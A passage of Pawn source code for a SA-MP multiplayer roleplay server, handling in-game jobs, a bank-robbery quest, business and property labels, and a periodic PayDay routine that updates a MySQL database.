						GiveMoney(GetPVarInt(playerid,"ChID"),-GetPVarInt(GetPVarInt(playerid,"ChID"),"RepCena"));
						if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
						SendClientMessage(playerid,CREWARD,"Вы успешно отремонтировали машину");
						SendClientMessage(GetPVarInt(playerid,"ChID"),CREWARD,"Ваш транспорт успешно отремонтировал");
						DeletePVar(GetPVarInt(playerid,"ChID"),"RepCena");
						DeletePVar(playerid,"ChID");
					}
					case 5:
					{
						new rand = random(400 - 100) + 100;
						GiveMoney(playerid,rand);
						BizInfo[GetPVarInt(playerid,"PBIZ")][bMoney] -= rand;
						format(str3, sizeof(str3), fmt_string3,rand);
						SendClientMessage(playerid,CREWARD,str1);
						format(string5, sizeof(string5), fmt_str5, BizInfo[GetPVarInt(playerid,"PBIZ")][bMoney]);
						Update3DTextLabelTextEx(BotLable1[GetPVarInt(playerid,"PBIZ")],-1,string5);
					}
					case 6:
					{
					    SetTimerEx("ClearAnim", 300, 0, "d", playerid);
					    SendClientMessage(playerid,CGREEN,"Вам удалось разделать ингредиент. Возьмите оставшиеся ингредиенты");
						DestroyDynamicObject(GetPVarInt(playerid,"PovarObject"));
						DeletePVar(playerid,"PovarObject");
						SetPlayerCheckpoint(playerid,1390.6154,-1.6414,1000.9299, 1.0);
						SetPVarInt(playerid,"PovarW",3);
						if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
					}
					case 7:
					{
					    SetTimerEx("ClearAnim", 300, 0, "d", playerid);
						if(IsValidDynamicObject(GetPVarInt(playerid,"MedicObj1") && GetPVarInt(playerid,"MedicObj1") != 0)) DestroyDynamicObject(GetPVarInt(playerid,"MedicObj1")),DeletePVar(playerid,"MedicObj1");
						if(IsValidDynamicObject(GetPVarInt(playerid,"MedicObj2") && GetPVarInt(playerid,"MedicObj2") != 0)) DestroyDynamicObject(GetPVarInt(playerid,"MedicObj2")),DeletePVar(playerid,"MedicObj2");
						if(IsValidDynamicObject(GetPVarInt(playerid,"MedicObj3") && GetPVarInt(playerid,"MedicObj3") != 0)) DestroyDynamicObject(GetPVarInt(playerid,"MedicObj3")),DeletePVar(playerid,"MedicObj3");
						SetPlayerAttachedObject(playerid, 1, 11738, 5, 0.218999, 0.014000, 0.000000, 0.000000, -91.800025, 6.099999, 1.000000, 1.00, 1.000000);
						SetPVarInt(playerid,"MedicW",3);
						SendClientMessage(playerid,CGREEN,"Отнесите аптечку на склад.");
						SetPlayerCheckpoint(playerid, 2564.3335,-1293.0745,1044.1250, 1.0);
					}
					case 10:
					{
					    SetTimerEx("ClearAnim", 300, 0, "d", playerid);
						if(IsValidDynamicObject(GetPVarInt(playerid,"ArmyObj1") && GetPVarInt(playerid,"ArmyObj1") != 0)) DestroyDynamicObject(GetPVarInt(playerid,"ArmyObj1")),DeletePVar(playerid,"ArmyObj1");
						SetPVarInt(playerid,"ArmyW",2);
						SetPlayerSpecialAction(playerid,25);
						SetPlayerAttachedObject(playerid, 1, 2358, 1, 0.056999, 0.330999, -0.041999, 0.000000, 95.199981, -179.000045, 1.000000, 1.00, 1.000000);
						SendClientMessage(playerid,CGREEN,"Отнесите материалы на склад.");
						SetPlayerCheckpoint(playerid, 2229.2844,1580.4386,999.9686, 3.0);
					}
					case 11:
					{
					    SetTimerEx("ClearAnim", 300, 0, "d", playerid);
					    switch(random(3))
					    {
					        case 0: SetPlayerAttachedObject(playerid, 5, 2704, 5, 0.458000, 0.000000, -0.031000, 0.000000, -87.299987, 0.000000, 1.000000, 1.00, 1.000000);
					        case 1: SetPlayerAttachedObject(playerid, 5, 2705, 5, 0.459000, -0.004999, -0.029999, 0.000000, -88.299980, 0.000000, 1.000000, 1.00, 1.000000);
					        case 2: SetPlayerAttachedObject(playerid, 5, 2689, 5, 0.456999, 0.000000, 0.000000, 0.000000, -90.599990, 0.000000, 1.000000, 1.00, 1.000000);
					    }
					    SendClientMessage(playerid,CGREEN,"Отнесите вещь на упаковочный стол.");
					    
					    new rand = GetPVarInt(playerid,"ShveR");/*random(sizeof(upokovka));*/
						SetTimerEx("TimerCheckPoint",1000,false,"dffff",playerid, upokovka[rand][0],upokovka[rand][1],upokovka[rand][2], 1.0);
					//	SetPVarInt(playerid,"ShveR",rand);
						SetPVarInt(playerid,"ShveW",3);
					//	DestroyDynamicObject(GetPVarInt(playerid,"ShveObject"));
					//	DeletePVar(playerid,"ShveObject");
					}
					case 14:
					{
					    SetTimerEx("ClearAnim", 300, 0, "d", playerid);
					    SendClientMessage(playerid,CREWARD,"Встаньте на пикап раздевалке, чтобы украсть форму!");
				    	new Float:x,Float:y,Float:z;
						new Float:rx,Float:ry,Float:rz;
						new doorobj;
						new Float:pdrz;
						new Float:px,Float:py,Float:pz;
						GetPlayerPos(playerid,px,py,pz);
						doorobj = (GetPlayerVirtualWorld(playerid) == 17) ? (doorpd1[15]) : (doorpd[15]);

						Streamer_GetFloatData(STREAMER_TYPE_OBJECT, doorobj, E_STREAMER_R_Z, pdrz);
						GetDynamicObjectRot(doorobj,rx,ry,rz);

				 	 	if(!IsDynamicObjectMoving(doorobj) && floatround(rz) == floatround(pdrz))
				 	 	{
				 	 	    GetDynamicObjectRot(doorobj,rx,ry,rz);
				        	GetDynamicObjectPos(doorobj,x,y,z);
				        	MoveDynamicObject(doorobj,x,y+0.02,z,0.12,   rx,ry,(floatround(py) > y) ? (270.0) : (-270.0));
							SetTimerEx("MoveObjectOpenRot",10000,false,"dfffffff",doorobj,x,y,z,0.12,   rx,ry,rz);
				 	 	}
					}
					case 15:
					{
					    SetTimerEx("ClearAnim", 300, 0, "d", playerid);

					    SendClientMessage(playerid,CREWARD,"Купите бомбу на черном рынке!");
	        			SetPVarInt(playerid,"GrabQuestW",1);
					}
					
					case 17:
					{
					    SetTimerEx("ClearAnim", 300, 0, "d", playerid);
					    new band = PlayerInfo[playerid][pGrabTeam];
					    BankGrab[band][bGrabStatus] = 4;
					    new i = BankGrab[band][bTown];
					    MoveDynamicObject(BankHack[i][bankDoor][1],1376.654174, -9.294741+0.1, 1003.401123, 0.12,0.000000, -0.000007, 120.0);
					    MoveDynamicObject(BankHack[i][bankDoor][2],1373.653442, -9.325742+0.1, 1003.401123,0.12, 0.000000, 0.000007, 69.000000);
					    SendBandMes(PlayerInfo[playerid][pGrabTeam],CREWARD,"Установите бомбу на дверь в хранилище!");
						SendBandMes(PlayerInfo[playerid][pGrabTeam],-1,"Для установки используйте: {f7ae11}LALT");
					    //door open 2
					}
					case 18:
					{
					    SetTimerEx("ClearAnim", 300, 0, "d", playerid);
						new str[60];
						new money = random(20000)+30000;
						format(str,sizeof(str),"Вы взломали ячейку и забрали {f7ae11}%d$",money);
						SendClientMessage(playerid,-1,str);
						SendClientMessage(playerid,CREWARD,"Отнесите деньги в транспорт!");
						SendClientMessage(playerid,-1,"Для того, чтобы положить деньги в трансапорт используйте: {f7ae11}/put");

						SetPVarInt(playerid,"MoneyV",money);
						SetPlayerAttachedObject(playerid, 1, 1550, 1, 0.000000, -0.235999, 0.000000, 0.000000, 86.400009, 174.600006, 1.000000, 1.00, 1.000000);
						new ya = GetPVarInt(playerid,"Yach");
						new d = BankGrab[PlayerInfo[playerid][pGrabTeam]][bTown];
					    BankHack[d][bYaStatus][ya] = 2;
					    BankGrab[PlayerInfo[playerid][pGrabTeam]][bGrab] = 6;
					    UpdateYach(d,ya);

					}

				}
				DeletePVar(playerid,"Vzlom");
				return;
			}
			progress[playerid] = progress[playerid]-1;
			PlayerTextDrawHide(playerid,Progress[playerid][4]);
			PlayerTextDrawTextSize(playerid, Progress[playerid][4], (125.333358/100)*progress[playerid], 8.462213);
			PlayerTextDrawShow(playerid,Progress[playerid][4]);
		}
	}
	return;
}

/*
*/
GetCoordBootVehicle(vehicleid, &Float:x, &Float:y, &Float:z) // вот эта функция нам и прогодиться для нахождения координат багажника
{
    new Float:angle,Float:distance;
    GetVehicleModelInfo(GetVehicleModel(vehicleid), 1, x, distance, z);
    distance = distance/2 + 0.1;
    GetVehiclePos(vehicleid, x, y, z);
    GetVehicleZAngle(vehicleid, angle);
    x += (distance * floatsin(-angle+180, degrees));
    y += (distance * floatcos(-angle+180, degrees));
    return 1;
}

stock UpdateKom(idx)
{
	if(!strcmp(KomInfo[idx][kOwner],"None",true))
	{
		static const fmt_string2[] = "Комната {f7ae11}№%i";
		new str2[sizeof(fmt_string2)+3];
		format(str2, sizeof(str2), fmt_string2,KomInfo[idx][kNum]);
		Update3DTextLabelTextEx(KomInfo[idx][kText], -1, str2);
	}
	else
	{
		static const fmt_string2[] = "Комната {f7ae11}№%i{ffffff}\nВладелец: {f7ae11}%s";
		new str2[sizeof(fmt_string2)+3+24];
		format(str2, sizeof(str2), fmt_string2,KomInfo[idx][kNum],KomInfo[idx][kOwner]);
		Update3DTextLabelTextEx(KomInfo[idx][kText], -1, str2);
	}
	return true;
}
stock UpdateBiz(idx)
{
	new text[30],krisha[30];
	if(BizInfo[idx][bMafia]) format(krisha,sizeof(krisha),FracInfo[BizInfo[idx][bMafia]][fName]);
	else krisha = "Нет";
	switch(BizInfo[idx][bLock])
	{

		case 0: text = "{35A623}Открыто";
		case 1: text = "{C1351A}Закрыто";
		case 2: text = "{C1351A}На ремонте";
	}
	if(!strcmp(BizInfo[idx][bOwner], "None", true))
	{

		static const fmt_string2[] = "{FFD122}%s\n{35A623}Бизнес продается\n{FFFFFF}Цена: {FFD122}%i$\n{FFFFFF}Статус: %s\nКрыша: {f7ae11}%s";
		new str2[sizeof(fmt_string2)+100];
		format(str2, sizeof(str2), fmt_string2,BizInfo[idx][bName],BizInfo[idx][bPrice],text,krisha);
		Update3DTextLabelTextEx(BizzLable[idx], -1, str2);
	}
	else
	{

		new text1[35];
		switch(BizInfo[idx][bVhod])
		{

			case 0: text1 = "";
			default: format(text1,sizeof(text1),"{FFFFFF}Цена за вход: {FFD122}%i$",BizInfo[idx][bVhod]);
		}
		static const fmt_string2[] = "{FFD122}%s\n{FFFFFF}Владелец: {1B6EDA}%s\n{FFFFFF}Статус: %s\n%s\nКрыша: {f7ae11}%s";
		new str2[sizeof(fmt_string2)+100];
		format(str2, sizeof(str2), fmt_string2,BizInfo[idx][bName],BizInfo[idx][bOwner],text,text1,krisha);
		Update3DTextLabelTextEx(BizzLable[idx], -1, str2);
	}
}
stock Log(namelog[],string[])
{
    new text[256],log[50],File:LogFile,i;
	format(text, sizeof(text), "%s\r\n",string);
	format(log,sizeof(log),"logs/%s.log",namelog);
	LogFile = fopen(log, io_append);
	while (text[i] != EOS)
	{
		fputchar(LogFile, text[i], false);
		i++;
	}
	fclose(LogFile);
}
forward BusTimer(playerid);
public BusTimer(playerid)
{
    SetPVarInt(playerid,"Check",GetPVarInt(playerid,"Check")+1);
    TogglePlayerControllable(playerid,1);
    switch(GetPVarInt(playerid,"Mar"))
    {
		case 1: SetPlayerRaceCheckpoint(playerid, 0, Gorodskoy1[GetPVarInt(playerid,"Check")][0], Gorodskoy1[GetPVarInt(playerid,"Check")][1], Gorodskoy1[GetPVarInt(playerid,"Check")][2], Gorodskoy1[GetPVarInt(playerid,"Check")+1][0], Gorodskoy1[GetPVarInt(playerid,"Check")+1][1], Gorodskoy1[GetPVarInt(playerid,"Check")+1][2], 5);
        case 2: SetPlayerRaceCheckpoint(playerid, 0, Gorodskoy2[GetPVarInt(playerid,"Check")][0], Gorodskoy2[GetPVarInt(playerid,"Check")][1], Gorodskoy2[GetPVarInt(playerid,"Check")][2], Gorodskoy2[GetPVarInt(playerid,"Check")+1][0], Gorodskoy2[GetPVarInt(playerid,"Check")+1][1], Gorodskoy2[GetPVarInt(playerid,"Check")+1][2], 5);
        case 3: SetPlayerRaceCheckpoint(playerid, 0, Gorodskoy3[GetPVarInt(playerid,"Check")][0], Gorodskoy3[GetPVarInt(playerid,"Check")][1], Gorodskoy3[GetPVarInt(playerid,"Check")][2], Gorodskoy3[GetPVarInt(playerid,"Check")+1][0], Gorodskoy3[GetPVarInt(playerid,"Check")+1][1], Gorodskoy3[GetPVarInt(playerid,"Check")+1][2], 5);
 //       case 4: SetPlayerRaceCheckpoint(playerid, 0, Gorodskoy4[GetPVarInt(playerid,"Check")][0], Gorodskoy4[GetPVarInt(playerid,"Check")][1], Gorodskoy4[GetPVarInt(playerid,"Check")][2], Gorodskoy4[GetPVarInt(playerid,"Check")][3], Gorodskoy4[GetPVarInt(playerid,"Check")][4], Gorodskoy4[GetPVarInt(playerid,"Check")][5], 5);
  //      case 5: SetPlayerRaceCheckpoint(playerid, 0, Gorodskoy5[GetPVarInt(playerid,"Check")][0], Gorodskoy5[GetPVarInt(playerid,"Check")][1], Gorodskoy5[GetPVarInt(playerid,"Check")][2], Gorodskoy5[GetPVarInt(playerid,"Check")][3], Gorodskoy5[GetPVarInt(playerid,"Check")][4], Gorodskoy5[GetPVarInt(playerid,"Check")][5], 5);
	}
}
GetCoordBonnetVehicle(vehicleid, &Float:x, &Float:y, &Float:z)
{
    new Float:angle,Float:distance;
    GetVehicleModelInfo(GetVehicleModel(vehicleid), 1, x, distance, z);
    distance = distance/2 + 0.1;
    GetVehiclePos(vehicleid, x, y, z);
    GetVehicleZAngle(vehicleid, angle);
    x -= (distance * floatsin(-angle+180, degrees));
    y -= (distance * floatcos(-angle+180, degrees));
    return 1;
}
forward anim2(playerid);
public anim2(playerid)
{
        ApplyAnimation(playerid, "ped", "getup", 4.0, 0, 1, 0, 0, 0,0);
        return 1;
}
function UpdProd()
{
		static const fmt_string1[] = "{FFFFFF}Продуктов на складе: {f7ae11}%i";
		new str1[sizeof(fmt_string1)+5];
		format(str1, sizeof(str1), fmt_string1,Prod);
		Update3DTextLabelTextEx(ProdText, CREWARD, str1);
}
GeneratePassword()
{
	new bigletters[26][] = {"A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"};
	new password[5];
	format(password,5,"%s",bigletters[random(25)]);
	return password;
}
stock BizMinus(num,bab,prod)
{
	new krek = bab*25/100;
	BizInfo[num][bMafiaM] += krek;
	BizInfo[num][bCashAll] += bab;
	if(strcmp(BizInfo[num][bOwner], "None", true))
	{
		BizInfo[num][bProd] -= prod;
		new krek2 = (bab*75/100) - BizInfo[num][bAkcAll]*(bab*75/100)/100;
		BizInfo[num][bMoney] +=krek2-krek2;
//		query = "";
//		format(query, sizeof(query), "UPDATE `biz` SET `prod` = %d,`money` = %d  WHERE id = '%d' LIMIT 1",BizInfo[num][bProd],BizInfo[num][bMoney],num);
//		mysql_tquery(mysql,query);
	}
}
stock PayDayGo()
{
	new hour,minut,sec;
	gettime(hour,minut,sec);
	

	new string[50];
	for(new i;i < sizeof(MusorPos); i ++)
	{
	    if(MusorCount[i] < 100)
	    {
			MusorCount[i] +=20;
			
			format(string, sizeof(string), "Мусор: {f7ae11}%d/100%", MusorCount[i]);
			UpdateDynamic3DTextLabelText(MusorText[i], -1, string);
		}
	}
	static const fmt_string2[] = "{f7ae11}%s{FFFFFF}\nЦена: {f7ae11}$%i";
	new str2[sizeof(fmt_string2)+64+10];
	for(new idx = 1; idx <= TOTALV; idx++)
	{
	    if(VInfo[idx][vcar] == INVALID_VEHICLE_ID || !strcmp(VInfo[idx][vname], "None", true) || VInfo[idx][voplata] > gettime()) continue;
		if(!VInfo[idx][vfam])
		{
	     	if(GetPlayerID(VInfo[idx][vname]) != INVALID_PLAYER_ID)
			{
			//	DeletePVar(GetPlayerID(VInfo[idx][vname]),"PlayerHouse");
				GiveMoney(GetPlayerID(VInfo[idx][vname]),GetProcent1(VInfo[idx][vcost]));
			}
			else
			{
			    query = "";
			    format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE name = '%s' LIMIT 1", VInfo[idx][vname]);
				mysql_tquery(mysql, query, "ResetVse", "sd", VInfo[idx][vname],GetProcent1(VInfo[idx][vcost]));
				
				
			   /* format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE name = '%s' LIMIT 1", VInfo[idx][vname]);
				mysql_tquery(mysql,query);
				mysql_store_result();
				if(mysql_fetch_row_format(query))
				{
					new tr[15],cash;
					mysql_get_field("cash", tr), cash = strval(tr);
					SetPlayerInt(VInfo[idx][vname],"cash",cash+GetProcent1(VInfo[idx][vcost]));
				}
				mysql_free_result();*/
			}
		}
		else FamInfo[VInfo[idx][vfam]][fKazna] += GetProcent1(VInfo[idx][vcost]);
		strmid(VInfo[idx][vname], "None", 0, strlen("None"), MAX_PLAYER_NAME);
		VInfo[idx][vsing] = 0;
		VInfo[idx][vx] = VInfo[idx][vxmag];
		VInfo[idx][vy] = VInfo[idx][vymag];
		VInfo[idx][vz] = VInfo[idx][vzmag];
		VInfo[idx][vfa] = VInfo[idx][vfmag];
		VInfo[idx][vsvet] = 3;
		VInfo[idx][vtext] = 1;
		VInfo[idx][vfam] = 0;
		for(new i = 0; i <= 13; i++) VInfo[idx][vtuning][i] = 0;
		format(VInfo[idx][vtunings],100,"0,0,0,0,0,0,0,0,0,0,0,0,0");
		VInfo[idx][vcolor1] = 1; VInfo[idx][vcolor2] = 1;
        Locked[VInfo[idx][vcar]] = -1;
		DestroyVehicle(VInfo[idx][vcar]);
		query = "";
		format(query,sizeof(query),"UPDATE `veh` SET  `name` = '%s', `num` = '%s', `x` = '%f', `y` = '%f', `z` = '%f', `fa` = '%f', `tuning` = '%s', `color1` = 1, `color2` = 1, `svet` = 3, fam = '0' WHERE id = '%d' LIMIT 1",VInfo[idx][vname],VInfo[idx][vnumber],VInfo[idx][vx]
		,VInfo[idx][vy],VInfo[idx][vz],VInfo[idx][vfa],VInfo[idx][vtunings],VInfo[idx][vnumber]);
		mysql_tquery(mysql,query);
		strmid(VInfo[idx][vnumber], "Nope", 0, strlen("Nope"), MAX_PLAYER_NAME);
		VInfo[idx][vcar] = CreateVehicle(VInfo[idx][vmodel], VInfo[idx][vx],VInfo[idx][vy],VInfo[idx][vz], VInfo[idx][vfa], VInfo[idx][vcolor1], VInfo[idx][vcolor2], 60000);
	
		format(str2, sizeof(str2), fmt_string2,VehicleNameS[VInfo[idx][vmodel]-400],VInfo[idx][vcost]);
        UpdateDynamic3DTextLabelText(CarLable[VInfo[idx][vcar]],-1,str2);
	}
	for(new i5 = 1; i5<= TOTALGZ; i5++) FracBank[GZInfo[i5][gFrak]] += 50;
	new days,mon,yer;
 	getdate(yer,mon,days);
	for(new i3 = 1; i3 <= TOTALBIZ; i3++)
	{
		
		
        if(BizInfo[i3][bMafia])
		{
			FracBank[BizInfo[i3][bMafia]] += BizInfo[i3][bMafiaM];
	        BizInfo[i3][bMafiaM] = 0;
        }
		if(!strcmp(BizInfo[i3][bOwner],"None",true)) continue;
	//	print("пошло анятые");
		if(BizInfo[i3][bZeml] < gettime() || BizInfo[i3][bZeml] == 0)
		{
		    BizInfo[i3][bZeml] = 0;
		//	print("пошло земля меньше");
			BizInfo[i3][bLockTime]++;
			query = "";
			format(query, sizeof(query), "UPDATE `biz` SET `locktime` = %i, `zeml` = 0  WHERE id = '%d' LIMIT 1",BizInfo[i3][bLockTime],i3);
			mysql_tquery(mysql,query);
		}
		if(BizInfo[i3][bLockTime] >= 36)
		{
		    print("слёт");
		    if(GetPlayerID(BizInfo[i3][bOwner]) != INVALID_PLAYER_ID)
			{
				DeletePVar(GetPlayerID(BizInfo[i3][bOwner]),"PlayerBiz");
				GiveMoney(GetPlayerID(BizInfo[i3][bOwner]),GetProcent1(BizInfo[i3][bPrice]));
			}
			else
			{
			    query = "";
			    format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE name = '%s' LIMIT 1", BizInfo[i3][bOwner]);
				mysql_tquery(mysql, query, "ResetVse", "sd", BizInfo[i3][bOwner],GetProcent1(BizInfo[i3][bPrice]));
			   /* format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE name = '%s' LIMIT 1", BizInfo[i3][bOwner]);
				mysql_tquery(mysql,query);
				mysql_store_result();
				if(mysql_fetch_row_format(query))
				{
					new tr[15],cash;
					mysql_get_field("cash", tr), cash = strval(tr);
					SetPlayerInt(BizInfo[i3][bOwner],"cash",cash+GetProcent1(BizInfo[i3][bPrice]));
				}
				mysql_free_result();*/
			}
			BizInfo[i3][bProd] = 100;
			BizInfo[i3][bLockTime] = 0;
			BizInfo[i3][bLock] = 0;
			strmid(BizInfo[i3][bOwner], "None", 0, strlen("None"), MAX_PLAYER_NAME);
			UpdateBiz(i3);
			query = "";
			format(query, sizeof(query), "UPDATE `biz` SET `owner` = 'None',`prod` = %d,`lock` = %i,`locktime` = %i WHERE id = '%d' LIMIT 1",BizInfo[i3][bProd],BizInfo[i3][bLock],BizInfo[i3][bLockTime],i3);
			mysql_tquery(mysql,query);
			print("слтеле");
		}
	}
	SetMatsInt("grovemoney",FracBank[F_GROVE]);
	SetMatsInt("ballasmoney",FracBank[F_BALLAS]);
	SetMatsInt("bikersmoney",FracBank[F_BIKERS]);
	SetMatsInt("aztecasmoney",FracBank[F_AZTECAS]);
	SetMatsInt("vagosmoney",FracBank[F_VAGOS]);
	SetMatsInt("lcnmoney",FracBank[F_LCN]);
	SetMatsInt("rmmoney",FracBank[F_RM]);
	SetMatsInt("triadmoney",FracBank[F_YAKUZA]);
	UpdateMat(F_GROVE);
 	UpdateMat(F_BALLAS);
 	UpdateMat(F_BIKERS);
	UpdateMat(F_AZTECAS);
	UpdateMat(F_VAGOS);
	UpdateMat(F_RIFA);
	UpdateMat(F_LCN);
	UpdateMat(F_YAKUZA);
	UpdateMat(F_RM);
	for(new x = 1; x<= TOTALBIL; x++)
	{
	    if(BildInfo[x][bDay] > gettime()) continue;

	    BildInfo[x][bFontSize] = 0;
	    BildInfo[x][bBackColor] = 0;
		BildInfo[x][bFontFace] = 0;
		BildInfo[x][bDay] = 0;
		format(BildInfo[x][bOwner],1,"None");
	    UpdateBuildText(x);
        query = "";
	    format(query, sizeof(query), "UPDATE `billboards` SET `bDay` = 0, `bOwner` = 'None', `bText` = '-', `bFontSize` = 25, `bAligment` = 1, `bBackColor` = 1, `bFontFace` = 0 WHERE `id` = %i",x);
		mysql_tquery(mysql,query);
	}
	GetHome();
	static const fmt_string[] = "Точное время %02d:%02d";
	new str[sizeof(fmt_string)+2+2];
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(!IsPlayerConnected(i) || PlayerLogged[i] == false) continue;
	    //tp__ignore_tick[i] = GetTickCount()+TP__IGNORE_TIME;
		//gun__ignore_tick[i] = GetTickCount()+GUN__IGNORE_TIME;
		
		format(str, sizeof(str), fmt_string,hour,minut);
		SendClientMessage(i,CWHITE,str);
	    if(PlayerInfo[i][pMin] < 20 && PlayerInfo[i][pVip] < gettime()) SendClientMessage(i,CREWARD,"Вы должны отыграть больше 20 минут, чтобы получить PayDay");
		else PayDay(i);
		SetMatsInt("kazna",Kazna);
	}
	UpdateKazna();
	SendAdminMessage(CGREY,"[A] Аккаунты успешно сохранены");
	query = "";
	format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE `member` > '5' AND `member` < '11'  ORDER BY `gangscore` DESC LIMIT 5");
	mysql_tquery(mysql, query, "TopGangster", "d",1);
	UpdateTopGang();
	mysql_tquery(mysql, "SELECT * FROM accounts ORDER BY `bizac` DESC LIMIT 8", "TopAc");
	saveacc = GetTickCount()+900000;
	if(hour == 4)
	{
	    for(new i = 1; i <= TOTALBIZ; i++)
		{
		    query = "";
		    format(query, sizeof(query), "SELECT * FROM `bizpay` WHERE `bizid` = '%d' ORDER BY vrem DESC LIMIT 1",i);
			mysql_tquery(mysql, query, "BizPayFun", "d",i);
			query = "";
			format(query, sizeof(query), "SELECT * FROM `bizpay` WHERE `vrem` < '%d' ORDER BY vrem DESC LIMIT 1",gettime()-60*60*24*30*2);
			mysql_tquery(mysql, query, "DeleteStats", "d",i);
		}
		
	  /*  for(new i3 = 1; i3 <= TOTALBIZ; i3++)
		{
		    format(query, sizeof(query), "SELECT * FROM bizpay WHERE bizid = '%d' ORDER BY vrem DESC  LIMIT 1", i3);
			mysql_tquery(mysql,query);
			mysql_store_result();
			new money[10];
			if(mysql_num_rows() > 0)
			{
			    new text[15];
				for(new i = 0; i <= mysql_num_rows();i++)
				{
					mysql_fetch_row(query);
	                mysql_get_field("money", money);
				//	if(strval(money) > BizInfo[i3][b]) text = "{20BA09}[/\]";
				//	else if(strval(money) < BizInfo[i3][b]) text = "{F85A5A}[\/]";
				//	else if(strval(money) == BizInfo[i3][b]) text = "{FFFF00}[=]";
					format(query,sizeof(query),"INSERT INTO `bizpay` ( `bizid`, `vrem`, `date`, `stat`, `money`) \
					VALUES ('%d', '%d', '%02d.%02d.%02d', '%s', '%d')",i3,gettime(),days,mon,yer,text,BizInfo[i3][bCashAll]);
					mysql_tquery(mysql,query);
				}
				mysql_free_result();
			}
		}
BizInfo[i][bAkcAll] += kolvo;
            BizInfo[i][bAkc] += kolvo;
            BizInfo[i][bAkcP] = cena;
            SetBizInt(i,"bAkcAll",BizInfo[i][bAkcAll]);
			SetBizInt(i,"bAkcP",BizInfo[i][bAkcP]);
			SetBizInt(i,"bAkc",BizInfo[i][bAkc]);

		*/
	//	query = "";
     //   format(query, sizeof(query), "SELECT * FROM accounts WHERE biz < '4' AND ig < '%d'", gettime()-60*60*24*30);
	//	mysql_tquery(mysql, query, "DeleteAc");
		
		query = "";
        format(query, sizeof(query), "SELECT * FROM accounts WHERE level < '4' AND ig < '%d'", gettime()-60*60*24*30*3);
		mysql_tquery(mysql, query, "DeleteAccounts");
	    Restart();
	}
}
/*function DeleteAc()
{
	new rows = cache_get_row_count(mysql);
	if(rows > 0)
	{
		for(new row = 1; row<= rows; row++)
		{
			
		}
	}
    return 1;
}*/
function DeleteStats()
{
	new rows = cache_get_row_count(mysql);
	if(rows > 0)
	{
		for(new row = 1; row<= rows; row++)
		{
			query = "";
			format(query, sizeof(query), "DELETE FROM `bizpay` WHERE id = '%d'", cache_get_field_content_int(row-1, "id", mysql));
			mysql_tquery(mysql,query);
		}
	}
    return 1;
}
function BizPayFun(bizid)
{
	new rows = cache_get_row_count(mysql);
	new days,mon,yer;
 	getdate(yer,mon,days);
	if(rows > 0)
	{
	    new money,text[20];
		for(new row = 1; row<= rows; row++)
		{
            money = cache_get_field_content_int(row-1, "money", mysql);
            if(money > BizInfo[bizid][bCashAll]) text = "{20BA09}[+]";
			else if(money < BizInfo[bizid][bCashAll]) text = "{F85A5A}[-]";
			else if(money == BizInfo[bizid][bCashAll]) text = "{FFFF00}[=]";
            format(query,sizeof(query),"INSERT INTO `bizpay` ( `bizid`, `vrem`, `date`, `stat`, `money`) \
			VALUES ('%d', '%d', '%02d.%02d.%02d', '%s', '%d')",bizid,gettime(),days,mon,yer,text,BizInfo[bizid][bCashAll]);
			mysql_tquery(mysql,query);
			BizInfo[bizid][bCashAll] = 0;
		}
	}
	else
    {
        format(query,sizeof(query),"INSERT INTO `bizpay` ( `bizid`, `vrem`, `date`, `stat`, `money`) \
		VALUES ('%d', '%d', '%02d.%02d.%02d', '{FFFF00}[=]', '%d')",bizid,gettime(),days,mon,yer,BizInfo[bizid][bCashAll]);
		mysql_tquery(mysql,query);
		BizInfo[bizid][bCashAll] = 0;
    }
    return 1;
}
function DeleteAccounts()
{
    new rows = cache_get_row_count(mysql);
    if(rows>0)
    {
        for(new row = 1; row<= rows; row++)
		{
			query = "";
			format(query, sizeof(query), "DELETE FROM accounts WHERE id = '%d'", cache_get_field_content_int(row-1, "id", mysql));
			mysql_tquery(mysql,query);
		}
    }
    return 1;
}
stock GetHome()
{
	for(new i = 1; i <= TOTALHOUSE; i++)
	{
	    if(!strcmp(HInfo[i][hOwner], "None", true)) continue;
        if(HInfo[i][hOplata] < gettime())
        {
	        HInfo[i][hOplata] = 0;
	        HInfo[i][hLock] = 0;
	        if(GetPlayerID(HInfo[i][hOwner]) != INVALID_PLAYER_ID)
			{
				DeletePVar(GetPlayerID(HInfo[i][hOwner]),"PlayerHouse");
				GiveMoney(GetPlayerID(HInfo[i][hOwner]),GetProcent1(HInfo[i][hCost]));
			}
			else
			{
			    query = "";
       			format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE name = '%s' LIMIT 1", HInfo[i][hOwner]);
				mysql_tquery(mysql, query, "ResetVse", "sd",HInfo[i][hOwner],GetProcent1(HInfo[i][hCost]));
		/*	    format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE name = '%s' LIMIT 1", HInfo[i][hOwner]);
				mysql_tquery(mysql,query);
				mysql_store_result();
				if(mysql_fetch_row_format(query))
				{
					new tr[15],cash;
					mysql_get_field("cash", tr), cash = strval(tr);
					SetPlayerInt(HInfo[i][hOwner],"cash",cash+GetProcent1(HInfo[i][hCost]));
				}
				mysql_free_result();*/
			}
	        strmid( HInfo[i][hOwner], "None", 0, strlen("None"), 32);
	        strmid( HInfo[i][hZasel1], "None", 0, strlen("None"), 32);
	        strmid( HInfo[i][hZasel2], "None", 0, strlen("None"), 32);
	        strmid( HInfo[i][hZasel3], "None", 0, strlen("None"), 32);
	        strmid( HInfo[i][hZasel4], "None", 0, strlen("None"), 32);
   			DestroyDynamicPickup(HInfo[i][hPick]);
			DestroyDynamicMapIcon(HInfo[i][hMap]);
			HInfo[i][hMap] = CreateDynamicMapIcon(HInfo[i][hX],HInfo[i][hY],HInfo[i][hZ], 31, 0,-1,-1,-1,200.0);
			HInfo[i][hPick] = CreateDynamicPickup(1273,23,HInfo[i][hX],HInfo[i][hY],HInfo[i][hZ],0);
			query = "";
